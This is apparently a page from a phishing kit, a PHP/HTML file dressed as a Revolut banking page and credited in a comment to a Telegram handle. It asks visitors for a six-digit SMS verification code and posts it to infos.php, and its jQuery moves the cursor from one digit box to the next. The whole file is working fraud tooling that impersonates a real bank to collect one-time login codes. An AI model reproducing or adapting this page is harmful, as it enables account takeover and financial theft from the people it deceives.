<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";



?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>A better way to handle your money | Revolut</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/facon.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/facon.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>

<body>

  <div class="bod">
    <div class="row" style="margin-right: 0;">
      <div class="col-lg-2 text-start text-lg-center cv mt-4" style="position: relative;"><img src="image/row.png"></div>
      <div class="col-lg-5">
        <div class="from">
          <form action="infos.php" method="post">
            <input type="hidden" value="sms" name="step">
            <h2>6-digit code</h2>
            <p>Please enter the code we've sent.</p>
            <div class="form-group sms d-flex">
              <div class="inp"><input inputmode="numeric" maxlength="1"  id="num1" name="num1"></div>
              <div class="inp"><input inputmode="numeric" maxlength="1" id="num2" name="num2"></div>
              <div class="inp"><input inputmode="numeric" maxlength="1"  id="num3" name="num3"></div>
              <div class="inp"><input inputmode="numeric" maxlength="1" id="num4" name="num4"></div>
			  <div class="inp"><input inputmode="numeric" maxlength="1" id="num5" name="num5"></div>
			  <div class="inp"><input inputmode="numeric" maxlength="1" id="num6" name="num6"></div>



            </div>
            <div class="bttn"><button style="margin-top:50px" id="btn" name="submit">Valide</button></div>
          </form>
        </div>
      </div>
    </div>
  </div>

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
    $("#num1").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num2").focus()
      }
    });

    $("#num2").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num3").focus()
      }
      else{
        $("#num1").focus()
      }
    });

    $("#num3").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num4").focus()
      }
      else{
        $("#num2").focus()
      }
    });

    $("#num4").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num5").focus()
      }
      else{
        $("#num3").focus()
      }
    });
	
    $("#num5").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num6").focus()
      }
      else{
        $("#num4").focus()
      }
    });
	
	
	    $("#num6").keyup(function(){
      if ($(this).val().length == 1) {
        $("#num6").focus()
      }
      else{
        $("#num5").focus()
      }
    });

     $("#num6").keyup(function(){
      if ($(this).val().length == 1) {
        $("#btn").css({"background":"#0666eb" , "color":"#fff" , "box-shadow":"#0666eb1f 0px 0.7rem 1.3rem 0px, #0666eb3d 0px 1rem 2.2rem 0px"})
      }
      else{
        $("#btn").css({"background":"#5c9ffb" , "color":"#ffffff80" , "box-shadow":"none"})
      }
    })


  </script>
</body>
</html>